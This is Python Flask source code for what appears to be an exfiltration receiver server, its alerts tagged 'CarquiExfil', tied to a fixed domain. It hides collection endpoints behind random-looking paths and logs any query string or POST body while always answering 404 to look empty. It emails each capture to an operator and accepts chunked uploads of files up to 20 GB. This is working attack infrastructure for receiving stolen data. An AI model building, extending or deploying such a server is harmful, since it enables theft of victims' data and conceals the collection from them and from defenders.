from flask import Flask, request, send_from_directory, jsonify
from werkzeug.utils import secure_filename
from werkzeug.middleware.proxy_fix import ProxyFix
from datetime import datetime
import os
import hashlib
from email.message import EmailMessage
import smtplib, ssl
from dotenv import load_dotenv
import logging

load_dotenv("/opt/email/.env")

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)

ALLOWED_HOSTS = {"moltsgats.site", "www.moltsgats.site"}
UPLOAD_FOLDER = "uploads"
CHUNK_FOLDER = "chunked"
DATA_FILE = "data.txt"

# Email Config
SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = int(os.getenv("SMTP_PORT"))
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECIPIENT = os.getenv("EMAIL_RECIPIENT")

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(CHUNK_FOLDER, exist_ok=True)
open(DATA_FILE, "a").close()

app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024 * 1024
logging.basicConfig(level=logging.DEBUG)

@app.before_request
def block_direct_ip_access():
    host = request.host.split(":")[0]
    if host not in ALLOWED_HOSTS:
        return "", 404

@app.route("/")
def serve_index():
    return send_from_directory("public", "index.html")

@app.route("/<path:filename>")
def serve_static(filename):
    return send_from_directory("public", filename)


# Custom POST endpoint (log + email)
@app.route("/hgrue43TGfuig8t74327", methods=["GET", "POST"])
def handle_request():
    client_ip = request.remote_addr  # Now this contains the real IP!

    if request.method == "GET":
        content = request.query_string.decode("utf-8")
        if content:
            save_to_file(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]: {content}", "GET")
            return "",404 # tenim parametre a la URL  
        return "",404 # URL sense parametres
    
    elif request.method == "POST":
        try:
            content = request.get_data(as_text=True)
            if content:
                save_to_file(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]: {content}", "POST")
                return "", 404
        except:
            return "",404 #algo no ha anat be


def calculate_file_hash(path, algorithm="sha1"):
    h = hashlib.new(algorithm)
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            h.update(chunk)
    return h.hexdigest()

# Helpers
def save_to_file(content, method):
    with open(DATA_FILE, "a") as f:
        f.write(content + "\n\n")
    send_email(content, method)

@app.route("/upload-chunk-558676752", methods=["POST"])
def upload_chunk():
    try:
        chunk = request.files.get("chunk")
        chunk_index = int(request.form.get("chunkIndex"))
        total_chunks = int(request.form.get("totalChunks"))
        filename = secure_filename(request.form.get("filename"))
        chunk_hash = request.form.get("chunkHash")

        if not all([chunk, chunk_index is not None, total_chunks, filename, chunk_hash]):
            return "Missing parameters", 400

        chunk_dir = os.path.join(CHUNK_FOLDER, filename)
        os.makedirs(chunk_dir, exist_ok=True)

        chunk_path = os.path.join(chunk_dir, f"{chunk_index}.part")
        chunk.save(chunk_path)

        calc_hash = calculate_file_hash(chunk_path, "sha1")
        if calc_hash != chunk_hash:
            os.remove(chunk_path)
            return f"Chunk hash mismatch (got {calc_hash}, expected {chunk_hash})", 400

        app.logger.debug(f"Chunk {chunk_index + 1}/{total_chunks} for {filename} saved and verified.")
        return "Chunk uploaded", 200

    except Exception as e:
        app.logger.error(f"Upload chunk error: {e}")
        return "Server error", 500

@app.route("/assemble-6326476954", methods=["POST"])
def assemble():
    try:
        data = request.get_json(force=True)
        filename = secure_filename(data["filename"])
        total_chunks = int(data["totalChunks"])

        chunk_dir = os.path.join(CHUNK_FOLDER, filename)
        if not os.path.isdir(chunk_dir):
            return "Missing chunks directory", 400

        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        name, ext = os.path.splitext(filename)
        final_filename = f"{name}-{timestamp}{ext}"
        assembled_path = os.path.join(UPLOAD_FOLDER, final_filename)

        with open(assembled_path, "wb") as out_file:
            for i in range(total_chunks):
                chunk_path = os.path.join(chunk_dir, f"{i}.part")
                if not os.path.exists(chunk_path):
                    return f"Missing chunk {i}", 400
                with open(chunk_path, "rb") as f:
                    out_file.write(f.read())

        for i in range(total_chunks):
            os.remove(os.path.join(chunk_dir, f"{i}.part"))
        os.rmdir(chunk_dir)

        app.logger.info(f"File {filename} assembled as {final_filename}.")
        send_email(f"File assembled: {final_filename}", "FILE")
        return final_filename, 200

    except Exception as e:
        app.logger.error(f"Assemble error: {e}")
        return "Server error", 500

def send_email(content, method):
    try:
        msg = EmailMessage()
        msg.set_content(f"CarquiExfil-{method}-{content}")
        msg["Subject"] = f"[CarquiExfil] Notification: {method}"
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECIPIENT

        context = ssl.create_default_context()
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls(context=context)
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)
        logging.info("Email sent.")

    except Exception as e:
        logging.error(f"Failed to send email: {e}")

@app.errorhandler(404)
def not_found(error):
    return "", 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)


